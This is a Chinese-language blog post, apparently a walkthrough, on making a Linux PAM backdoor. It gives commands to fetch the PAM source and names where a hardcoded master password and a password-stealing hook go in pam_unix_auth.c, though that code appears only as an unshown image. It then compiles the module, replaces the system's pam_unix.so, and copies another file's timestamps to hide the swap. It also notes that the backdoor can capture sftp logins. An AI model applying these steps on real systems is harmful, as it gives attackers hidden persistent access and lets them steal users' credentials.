# PAM后门制作

关于PAM后门的制作网上已经有很多教程了，这位师傅写的蛮详细。自己这里大体相当于复现了他的操作。

地址：https://xz.aliyun.com/t/7902



## 获取PAM源码包

```shell
#Debian系
apt list --installed|grep pam
dpkg -L libpam-modules:amd64 |grep pam_unix.so
dpkg -l libpam-modules:amd64

http://deb.debian.org/debian/pool/main/p/pam/pam_1.4.0.orig.tar.xz


#RHEL系
rpm -qf /usr/lib64/security/pam_unix.so
http://www.linux-pam.org/library/
```

## 插入后门逻辑

这里主要参考网上给出的那个位置进行后门代码注入。

```shell
pam_unix_auth.c     ... pam_sm_authenticate
```

下面的代码中同时给出了硬编码后门及口令窃取后门，具体改法如下：

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-13_145932.png)

## 编译

```shell
./configure && make
#下面具体的拷贝目的地与Linux的发行版有关，不同系统下位置略有差异。
mv /usr/lib/x86_64-linux-gnu/security/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so.bak
cp /root/Downloads/PAM/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so
chmod 644 /usr/lib/x86_64-linux-gnu/security/pam_unix.so
#改一下时间戳
touch -acmr /usr/lib/x86_64-linux-gnu/security/pam_warn.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so
```

## 效果

![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/2021-07-13_145807.png)

总体下来可以发现单论制作，比OpenSSH后门简单的多，同时理论上它应该也能偷取到sftp之类的其他使用PAM进行linux账户认证时输入的密码。

